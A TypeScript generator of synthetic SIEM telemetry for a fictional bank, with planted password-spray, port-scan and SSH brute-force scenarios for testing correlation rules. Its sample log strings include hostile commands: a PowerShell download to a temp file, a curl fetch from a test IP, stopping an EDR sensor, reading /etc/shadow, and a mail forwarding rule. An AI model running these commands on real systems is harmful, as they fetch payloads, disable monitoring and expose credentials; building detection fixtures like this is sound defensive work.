import type { Entity, NormalizedEvent, RawEvent, TelemetrySourceFamily } from "@/schemas";
import { DEMO_NOW_ISO, minus } from "@/lib/time";
import { makeRng } from "@/lib/prng";
import { TELEMETRY_SOURCE_CONFIGS, type TelemetrySourceConfig } from "./telemetry-sources";

/**
 * Deterministic synthetic telemetry generator.
 *
 * Every event is produced in two linked forms — raw (as received) and
 * normalized (post parse/normalize/enrich) — connected by `raw_payload_ref`,
 * so the Log Explorer can always trace a normalized event back to its source
 * (references/native-siem-spec.md, "event lineage").
 *
 * Roughly 2% of events are quarantined with a specific reason rather than
 * silently dropped, matching the spec's schema-validation-on-arrival rule.
 * All identifiers, hosts, IPs (RFC 5737 doc ranges), and domains (.test /
 * .example) are synthetic.
 */

const PARSER_INFO: Record<string, { parser: string; schema: string; format: RawEvent["format"] }> = {
  windows: { parser: "windows-evtx-parser@4.2.1", schema: "1.0", format: "evtx_json" },
  linux_syslog: { parser: "syslog-rfc5424-parser@2.7.0", schema: "1.0", format: "syslog_rfc5424" },
  firewall: { parser: "cef-parser@3.1.4", schema: "1.1", format: "cef" },
  cloud: { parser: "cloud-audit-parser@1.9.2", schema: "1.1", format: "json" },
  identity: { parser: "idp-audit-parser@2.3.0", schema: "1.0", format: "json" },
  email: { parser: "email-gateway-parser@1.4.0", schema: "1.0", format: "eml_headers" },
};

const GENERIC_QUARANTINE = [
  "schema_validation_failed: required field 'occurred_at' missing in raw payload; substituted receipt time",
  "enrichment_timeout: asset-context lookup exceeded 2s budget; event held for re-enrichment",
  "unsupported_schema_version: raw payload declared a schema version newer than this parser supports",
  "dedup_conflict: identical payload hash already ingested within the dedup window; held for review",
];
const QUARANTINE_REASONS: Record<RawEvent["format"], string[]> = {
  evtx_json: ["parse_error: EventData block truncated; XML did not close", ...GENERIC_QUARANTINE],
  syslog_rfc5424: ["parse_error: malformed RFC 5424 header (PRI/VERSION/TIMESTAMP not resolvable)", ...GENERIC_QUARANTINE],
  cef: ["parse_error: malformed CEF header (expected 7 pipe-delimited fields, got 5)", ...GENERIC_QUARANTINE],
  json: ["parse_error: invalid JSON (unexpected token at position 402)", ...GENERIC_QUARANTINE],
  eml_headers: ["parse_error: MIME headers unfolded incorrectly; From/To not resolvable", ...GENERIC_QUARANTINE],
};

interface EventTemplate {
  event_type: string;
  weight: number;
  /** ATT&CK technique ids to attach as event-level native tagging, if any */
  attack_refs?: string[];
  build: (rng: ReturnType<typeof makeRng>, hostPool: string[], userPool: string[]) => { entities: Entity[]; raw: Record<string, unknown> };
}

function hex(rng: ReturnType<typeof makeRng>, len: number): string {
  let s = "";
  for (let i = 0; i < len; i++) s += "0123456789abcdef"[rng.int(0, 15)];
  return s;
}
function extIp(rng: ReturnType<typeof makeRng>): string {
  const block = rng.pick(["203.0.113", "198.51.100", "192.0.2"]);
  return `${block}.${rng.int(1, 254)}`;
}
function intIp(rng: ReturnType<typeof makeRng>): string {
  return `10.${rng.int(10, 40)}.${rng.int(0, 255)}.${rng.int(1, 254)}`;
}

const TEMPLATES: Record<string, EventTemplate[]> = {
  windows: [
    {
      event_type: "windows_security_4624",
      weight: 40,
      build: (rng, hosts, users) => {
        const host = rng.pick(hosts);
        const user = rng.pick(users);
        return {
          entities: [
            { entity_type: "host", value: host },
            { entity_type: "user", value: user },
            { entity_type: "ip", value: intIp(rng) },
          ],
          raw: { EventID: 4624, Channel: "Security", Computer: host, TargetUserName: user, LogonType: rng.pick([2, 3, 10]) },
        };
      },
    },
    {
      event_type: "windows_security_4625",
      weight: 14,
      attack_refs: ["T1110", "T1110.001"],
      build: (rng, hosts, users) => {
        const host = rng.pick(hosts);
        const user = rng.pick(users);
        return {
          entities: [
            { entity_type: "host", value: host },
            { entity_type: "user", value: user },
            { entity_type: "ip", value: rng.chance(0.4) ? extIp(rng) : intIp(rng) },
          ],
          raw: { EventID: 4625, Channel: "Security", Computer: host, TargetUserName: user, Status: "0xC000006D", SubStatus: "0xC0000064" },
        };
      },
    },
    {
      event_type: "windows_powershell_4104",
      weight: 10,
      attack_refs: ["T1059", "T1059.001"],
      build: (rng, hosts, users) => {
        const host = rng.pick(hosts);
        return {
          entities: [
            { entity_type: "host", value: host },
            { entity_type: "user", value: rng.pick(users) },
          ],
          raw: {
            EventID: 4104,
            Channel: "Microsoft-Windows-PowerShell/Operational",
            Computer: host,
            ScriptBlockText: rng.pick([
              "Get-Process | Sort-Object CPU -Descending",
              "Invoke-WebRequest -Uri http://198.51.100.23/a -OutFile $env:TEMP\\a.bin",
              "Get-ADUser -Filter * -Properties memberOf",
            ]),
          },
        };
      },
    },
    {
      event_type: "windows_service_7045",
      weight: 6,
      attack_refs: ["T1543"],
      build: (rng, hosts) => {
        const host = rng.pick(hosts);
        return {
          entities: [{ entity_type: "host", value: host }],
          raw: { EventID: 7045, Channel: "System", Computer: host, ServiceName: `svc_${hex(rng, 6)}`, ImagePath: "C:\\Windows\\Temp\\u.exe" },
        };
      },
    },
    {
      event_type: "windows_process_4688",
      weight: 22,
      build: (rng, hosts, users) => {
        const host = rng.pick(hosts);
        return {
          entities: [
            { entity_type: "host", value: host },
            { entity_type: "user", value: rng.pick(users) },
          ],
          raw: {
            EventID: 4688,
            Channel: "Security",
            Computer: host,
            NewProcessName: rng.pick(["C:\\Windows\\System32\\cmd.exe", "C:\\Windows\\System32\\wbem\\WMIC.exe", "C:\\Program Files\\Contoso\\agent.exe"]),
            ParentProcessName: rng.pick(["C:\\Windows\\explorer.exe", "C:\\Windows\\System32\\services.exe"]),
          },
        };
      },
    },
    {
      event_type: "windows_defender_1116",
      weight: 4,
      attack_refs: ["T1562.001"],
      build: (rng, hosts) => {
        const host = rng.pick(hosts);
        return {
          entities: [{ entity_type: "host", value: host }, { entity_type: "hash", value: hex(rng, 64) }],
          raw: { EventID: 1116, Channel: "Microsoft-Windows-Windows Defender/Operational", Computer: host, ThreatName: "Behavior:Win32/Generic" },
        };
      },
    },
  ],
  linux_syslog: [
    {
      event_type: "linux_sshd_accepted",
      weight: 30,
      build: (rng, hosts, users) => ({
        entities: [
          { entity_type: "host", value: rng.pick(hosts) },
          { entity_type: "user", value: rng.pick(users) },
          { entity_type: "ip", value: intIp(rng) },
        ],
        raw: { facility: "auth", severity: "info", app: "sshd", msg: `Accepted publickey for ${rng.pick(users)} from ${intIp(rng)} port ${rng.int(30000, 60000)}` },
      }),
    },
    {
      event_type: "linux_sshd_failed",
      weight: 16,
      attack_refs: ["T1110", "T1110.003"],
      build: (rng, hosts, users) => ({
        entities: [
          { entity_type: "host", value: rng.pick(hosts) },
          { entity_type: "user", value: rng.pick(users) },
          { entity_type: "ip", value: rng.chance(0.6) ? extIp(rng) : intIp(rng) },
        ],
        raw: { facility: "auth", severity: "notice", app: "sshd", msg: `Failed password for ${rng.pick(users)} from ${extIp(rng)} port ${rng.int(30000, 60000)}` },
      }),
    },
    {
      event_type: "linux_sudo_command",
      weight: 12,
      attack_refs: ["T1548"],
      build: (rng, hosts, users) => ({
        entities: [
          { entity_type: "host", value: rng.pick(hosts) },
          { entity_type: "user", value: rng.pick(users) },
        ],
        raw: { facility: "authpriv", app: "sudo", msg: `${rng.pick(users)} : TTY=pts/0 ; PWD=/home ; USER=root ; COMMAND=${rng.pick(["/usr/bin/apt install", "/bin/systemctl stop falcon-sensor", "/usr/bin/cat /etc/shadow"])}` },
      }),
    },
    {
      event_type: "linux_cron_job",
      weight: 8,
      attack_refs: ["T1053"],
      build: (rng, hosts, users) => ({
        entities: [{ entity_type: "host", value: rng.pick(hosts) }, { entity_type: "user", value: rng.pick(users) }],
        raw: { facility: "cron", app: "CROND", msg: `(${rng.pick(users)}) CMD (/opt/scripts/sync_${hex(rng, 4)}.sh)` },
      }),
    },
    {
      event_type: "linux_auditd_execve",
      weight: 18,
      build: (rng, hosts, users) => ({
        entities: [{ entity_type: "host", value: rng.pick(hosts) }, { entity_type: "user", value: rng.pick(users) }],
        raw: { type: "EXECVE", app: "auditd", msg: `argc=2 a0="curl" a1="${rng.pick(["https://updates.example-cdn.test/pkg", "http://192.0.2.44/x"])}"` },
      }),
    },
  ],
  firewall: [
    {
      event_type: "firewall_allow",
      weight: 44,
      build: (rng) => ({
        entities: [
          { entity_type: "ip", value: intIp(rng) },
          { entity_type: "ip", value: extIp(rng) },
        ],
        raw: { act: "allow", proto: rng.pick(["tcp", "udp"]), spt: rng.int(1024, 65535), dpt: rng.pick([443, 80, 53, 22]), bytes: rng.int(200, 900000) },
      }),
    },
    {
      event_type: "firewall_deny",
      weight: 30,
      attack_refs: ["T1046"],
      build: (rng) => ({
        entities: [
          { entity_type: "ip", value: extIp(rng) },
          { entity_type: "ip", value: intIp(rng) },
        ],
        raw: { act: "deny", proto: "tcp", spt: rng.int(1024, 65535), dpt: rng.pick([3389, 445, 22, 1433, 23]), reason: "policy" },
      }),
    },
    {
      event_type: "firewall_ids_alert",
      weight: 10,
      attack_refs: ["T1071", "T1071.001"],
      build: (rng) => ({
        entities: [
          { entity_type: "ip", value: intIp(rng) },
          { entity_type: "ip", value: extIp(rng) },
          { entity_type: "domain", value: rng.pick(["cdn-sync.example-cdn.test", "telemetry.demo-metrics.test", "pool.updates.test"]) },
        ],
        raw: { act: "alert", sig: rng.pick(["ET POLICY External IP Lookup", "ET TROJAN Generic Beacon", "ET INFO Suspicious User-Agent"]), sev: rng.int(1, 3) },
      }),
    },
    {
      event_type: "firewall_dns_query",
      weight: 16,
      build: (rng) => ({
        entities: [
          { entity_type: "ip", value: intIp(rng) },
          { entity_type: "domain", value: rng.pick(["portal.northwind.example", "updates.example-cdn.test", "login.demo-idp.example", `${hex(rng, 12)}.dyn.example-cdn.test`]) },
        ],
        raw: { act: "dns", qtype: rng.pick(["A", "AAAA", "TXT"]), rcode: rng.pick(["NOERROR", "NXDOMAIN"]) },
      }),
    },
  ],
  cloud: [
    {
      event_type: "cloud_console_login",
      weight: 16,
      attack_refs: ["T1078", "T1078.004"],
      build: (rng, _hosts, users) => ({
        entities: [
          { entity_type: "user", value: rng.pick(users) },
          { entity_type: "ip", value: rng.chance(0.3) ? extIp(rng) : intIp(rng) },
        ],
        raw: { eventName: "ConsoleLogin", mfaUsed: rng.chance(0.85), result: rng.pick(["Success", "Success", "Failure"]) },
      }),
    },
    {
      event_type: "cloud_iam_policy_change",
      weight: 10,
      attack_refs: ["T1078.004"],
      build: (rng, _hosts, users) => ({
        entities: [
          { entity_type: "user", value: rng.pick(users) },
          { entity_type: "cloud_resource", value: `cloud://northwind/prod/iam/role/${rng.pick(["deploy", "readonly", "break-glass"])}` },
        ],
        raw: { eventName: rng.pick(["AttachRolePolicy", "PutUserPolicy", "CreateAccessKey"]), requestParameters: { policyArn: "policy://AdministratorAccess" } },
      }),
    },
    {
      event_type: "cloud_storage_download",
      weight: 12,
      attack_refs: ["T1567"],
      build: (rng, _hosts, users) => ({
        entities: [
          { entity_type: "user", value: rng.pick(users) },
          { entity_type: "cloud_resource", value: `cloud://northwind/prod/bucket/${rng.pick(["ledger-exports", "customer-statements", "backups"])}` },
          { entity_type: "ip", value: extIp(rng) },
        ],
        raw: { eventName: "GetObject", bytesTransferred: rng.int(1_000_000, 900_000_000) },
      }),
    },
    {
      event_type: "cloud_guardrail_disabled",
      weight: 3,
      attack_refs: ["T1562"],
      build: (rng, _hosts, users) => ({
        entities: [{ entity_type: "user", value: rng.pick(users) }, { entity_type: "cloud_resource", value: "cloud://northwind/prod/config/recorder" }],
        raw: { eventName: rng.pick(["StopConfigurationRecorder", "DeleteTrail", "PutRetentionPolicy"]) },
      }),
    },
  ],
  identity: [
    {
      event_type: "idp_signin_success",
      weight: 30,
      build: (rng, _hosts, users) => ({
        entities: [
          { entity_type: "user", value: rng.pick(users) },
          { entity_type: "ip", value: rng.chance(0.2) ? extIp(rng) : intIp(rng) },
        ],
        raw: { activity: "UserLoggedIn", conditionalAccess: "satisfied", clientApp: rng.pick(["Browser", "Mobile", "Desktop"]) },
      }),
    },
    {
      event_type: "idp_signin_failure",
      weight: 18,
      attack_refs: ["T1110", "T1110.003"],
      build: (rng, _hosts, users) => ({
        entities: [
          { entity_type: "user", value: rng.pick(users) },
          { entity_type: "ip", value: extIp(rng) },
        ],
        raw: { activity: "UserLoginFailed", errorCode: rng.pick([50126, 50053, 50055]), clientApp: "Browser" },
      }),
    },
    {
      event_type: "idp_mfa_challenge",
      weight: 12,
      build: (rng, _hosts, users) => ({
        entities: [{ entity_type: "user", value: rng.pick(users) }],
        raw: { activity: "MfaChallenge", result: rng.pick(["satisfied", "satisfied", "denied"]), method: rng.pick(["push", "totp", "sms"]) },
      }),
    },
    {
      event_type: "idp_role_grant",
      weight: 6,
      attack_refs: ["T1078"],
      build: (rng, _hosts, users) => ({
        entities: [{ entity_type: "user", value: rng.pick(users) }],
        raw: { activity: "Add member to role", role: rng.pick(["Global Administrator", "Helpdesk Admin", "Privileged Role Administrator"]) },
      }),
    },
    {
      event_type: "idp_account_discovery",
      weight: 8,
      attack_refs: ["T1087"],
      build: (rng, _hosts, users) => ({
        entities: [{ entity_type: "user", value: rng.pick(users) }],
        raw: { activity: "DirectoryQuery", filter: "(&(objectClass=user))", resultCount: rng.int(50, 4000) },
      }),
    },
  ],
  email: [
    {
      event_type: "email_delivered",
      weight: 30,
      build: (rng, _hosts, users) => ({
        entities: [
          { entity_type: "email_address", value: `${rng.pick(users)}@demo.zenc.example` },
          { entity_type: "email_address", value: `${rng.pick(["updates", "no-reply", "billing", "hr"])}@mail.example` },
        ],
        raw: { verdict: "clean", spf: "pass", dkim: "pass", subject: "Weekly statement is ready" },
      }),
    },
    {
      event_type: "email_blocked_phish",
      weight: 10,
      attack_refs: ["T1566"],
      build: (rng, _hosts, users) => ({
        entities: [
          { entity_type: "email_address", value: `${rng.pick(users)}@demo.zenc.example` },
          { entity_type: "email_address", value: `${rng.pick(["it-support", "payroll", "ceo-office"])}@secure-mail.test` },
          { entity_type: "domain", value: "secure-mail.test" },
        ],
        raw: { verdict: "blocked", reason: "impersonation", spf: "fail", subject: "URGENT: verify your account" },
      }),
    },
    {
      event_type: "email_forwarding_rule_created",
      weight: 4,
      attack_refs: ["T1114"],
      build: (rng, _hosts, users) => ({
        entities: [
          { entity_type: "email_address", value: `${rng.pick(users)}@demo.zenc.example` },
          { entity_type: "email_address", value: `collector-${hex(rng, 5)}@mail.example` },
        ],
        raw: { activity: "New-InboxRule", forwardTo: `collector-${hex(rng, 5)}@mail.example`, deleteMessage: true },
      }),
    },
  ],
};

function hostPoolFor(cfg: TelemetrySourceConfig): string[] {
  const prefix = cfg.tenant_id.includes("markets") ? "nwm" : "nwb";
  const roleWord = { windows: "ws", linux_syslog: "srv", firewall: "fw", cloud: "cld", identity: "idp", email: "mx" }[cfg.family];
  return Array.from({ length: 8 }, (_, i) => `${prefix}-${roleWord}-${String(i + 1).padStart(2, "0")}`);
}
const USER_POOL = ["jsmith", "agarcia", "pnair", "mbell", "dosei", "swhitfield", "lfischer", "svc-backup", "svc-deploy", "contractor-twong"];

export interface GeneratedEvents {
  raw: RawEvent[];
  normalized: NormalizedEvent[];
}

export function generateEvents(): GeneratedEvents {
  const raw: RawEvent[] = [];
  const normalized: NormalizedEvent[] = [];

  for (const cfg of TELEMETRY_SOURCE_CONFIGS) {
    const rng = makeRng(`events::${cfg.telemetry_source_id}`);
    const info = PARSER_INFO[cfg.family];
    const templates = TEMPLATES[cfg.family];
    const hosts = hostPoolFor(cfg);

    // "stale" = feed stopped ~16h ago; "degraded" = still flowing but laggy
    const windowHours = 72;
    const stopHoursAgo = cfg.health === "stale" ? 16 : 0;
    const count = Math.round(cfg.volume_weight * 14);

    for (let i = 0; i < count; i++) {
      const hoursAgo = stopHoursAgo + rng.next() * (windowHours - stopHoursAgo);
      const occurred_at = minus(DEMO_NOW_ISO, { minutes: Math.round(hoursAgo * 60) });

      const lagBase = cfg.base_lag_seconds;
      const lagJitter = cfg.health === "degraded" ? rng.int(60, 400) : rng.int(0, Math.max(2, Math.round(lagBase * 0.5)));
      const ingested_at = minus(occurred_at, { seconds: -(lagBase + lagJitter) });

      const tpl = rng.weighted(templates.map((t) => [t, t.weight] as [EventTemplate, number]));
      const { entities, raw: rawBody } = tpl.build(rng, hosts, USER_POOL);

      const seq = String(i + 1).padStart(4, "0");
      const rawRef = `seed-fixtures/${cfg.telemetry_source_id}/raw-${seq}.json`;

      raw.push({
        raw_payload_ref: rawRef,
        tenant_id: cfg.tenant_id,
        telemetry_source_id: cfg.telemetry_source_id,
        received_at: ingested_at,
        format: info.format,
        raw: { _source_family: cfg.family, _connector: cfg.connector_id, ...rawBody },
      });

      // ~2% quarantine on arrival — visible, never silently dropped
      const quarantined = rng.chance(0.02);
      const evt: NormalizedEvent = quarantined
        ? {
            event_id: `nevt-${cfg.telemetry_source_id}-${seq}`,
            tenant_id: cfg.tenant_id,
            telemetry_source_id: cfg.telemetry_source_id,
            occurred_at,
            ingested_at,
            event_type: tpl.event_type,
            raw_payload_ref: rawRef,
            normalization_status: "quarantined",
            quarantine_reason: rng.pick(QUARANTINE_REASONS[info.format]),
            parser_version: info.parser,
            schema_version: info.schema,
          }
        : {
            event_id: `nevt-${cfg.telemetry_source_id}-${seq}`,
            tenant_id: cfg.tenant_id,
            telemetry_source_id: cfg.telemetry_source_id,
            occurred_at,
            ingested_at,
            event_type: tpl.event_type,
            entities,
            attack_technique_refs: tpl.attack_refs && rng.chance(0.55) ? tpl.attack_refs : undefined,
            parser_version: info.parser,
            schema_version: info.schema,
            raw_payload_ref: rawRef,
            normalization_status: "normalized",
          };
      normalized.push(evt);
    }
  }

  injectAttackScenarios(raw, normalized);

  normalized.sort((a, b) => Date.parse(b.occurred_at) - Date.parse(a.occurred_at));
  return { raw, normalized };
}

/**
 * A few deterministic, bursty attack scenarios planted into the stream so the
 * threshold/sequence correlation rules have something real to fire on. Uniform
 * random background traffic never produces a burst; real intrusions do.
 * All synthetic — RFC 5737 addresses, demo accounts.
 */
function injectAttackScenarios(raw: RawEvent[], normalized: NormalizedEvent[]): void {
  const add = (
    sourceId: string,
    family: TelemetrySourceFamily,
    tag: string,
    n: number,
    startMinutesAgo: number,
    spanMinutes: number,
    build: (i: number) => { event_type: string; entities: Entity[]; attack_technique_refs?: string[]; rawBody: Record<string, unknown> },
  ) => {
    const info = PARSER_INFO[family];
    for (let i = 0; i < n; i++) {
      const minutesAgo = startMinutesAgo - (spanMinutes * i) / Math.max(1, n - 1);
      const occurred_at = minus(DEMO_NOW_ISO, { seconds: Math.round(minutesAgo * 60) });
      const ingested_at = minus(occurred_at, { seconds: -(info === PARSER_INFO.firewall ? 12 : 8) });
      const { event_type, entities, attack_technique_refs, rawBody } = build(i);
      const rawRef = `seed-fixtures/${sourceId}/scenario-${tag}-${String(i + 1).padStart(3, "0")}.json`;
      raw.push({
        raw_payload_ref: rawRef,
        tenant_id: "tenant-northwind-bank",
        telemetry_source_id: sourceId,
        received_at: ingested_at,
        format: info.format,
        raw: { _source_family: family, _scenario: tag, ...rawBody },
      });
      normalized.push({
        event_id: `nevt-scn-${tag}-${String(i + 1).padStart(3, "0")}`,
        tenant_id: "tenant-northwind-bank",
        telemetry_source_id: sourceId,
        occurred_at,
        ingested_at,
        event_type,
        entities,
        attack_technique_refs,
        parser_version: info.parser,
        schema_version: info.schema,
        raw_payload_ref: rawRef,
        normalization_status: "normalized",
      });
    }
  };

  // Scenario 1 — password spraying then a success (feeds the threshold rule AND the sequence rule)
  const sprayIp = "203.0.113.77";
  add("ts-nwb-identity-01", "identity", "spray", 20, 26 * 60, 9, () => ({
    event_type: "idp_signin_failure",
    entities: [
      { entity_type: "user", value: "contractor-twong" },
      { entity_type: "ip", value: sprayIp },
    ],
    attack_technique_refs: ["T1110", "T1110.003"],
    rawBody: { activity: "UserLoginFailed", errorCode: 50126 },
  }));
  add("ts-nwb-identity-01", "identity", "spray-success", 1, 26 * 60 - 11, 0, () => ({
    event_type: "idp_signin_success",
    entities: [
      { entity_type: "user", value: "contractor-twong" },
      { entity_type: "ip", value: sprayIp },
    ],
    rawBody: { activity: "UserLoggedIn", conditionalAccess: "satisfied" },
  }));

  // Scenario 2 — external port/service scan
  const scanIp = "198.51.100.113";
  add("ts-nwb-firewall-01", "firewall", "scan", 32, 40 * 60, 4, (i) => ({
    event_type: "firewall_deny",
    entities: [
      { entity_type: "ip", value: scanIp },
      { entity_type: "ip", value: `10.23.${20 + (i % 6)}.${10 + i}` },
    ],
    attack_technique_refs: ["T1046"],
    rawBody: { act: "deny", proto: "tcp", dpt: [3389, 445, 22, 1433, 23, 3306][i % 6], reason: "policy" },
  }));

  // Scenario 3 — failed SSH burst then accepted, same host (sequence rule, linux)
  add("ts-nwb-linux-01", "linux_syslog", "ssh-brute", 14, 52 * 60, 6, () => ({
    event_type: "linux_sshd_failed",
    entities: [
      { entity_type: "host", value: "nwb-srv-04" },
      { entity_type: "user", value: "svc-deploy" },
      { entity_type: "ip", value: "192.0.2.51" },
    ],
    attack_technique_refs: ["T1110"],
    rawBody: { app: "sshd", msg: "Failed password for svc-deploy from 192.0.2.51" },
  }));
  add("ts-nwb-linux-01", "linux_syslog", "ssh-accept", 1, 52 * 60 - 7, 0, () => ({
    event_type: "linux_sshd_accepted",
    entities: [
      { entity_type: "host", value: "nwb-srv-04" },
      { entity_type: "user", value: "svc-deploy" },
      { entity_type: "ip", value: "192.0.2.51" },
    ],
    rawBody: { app: "sshd", msg: "Accepted password for svc-deploy from 192.0.2.51" },
  }));
}
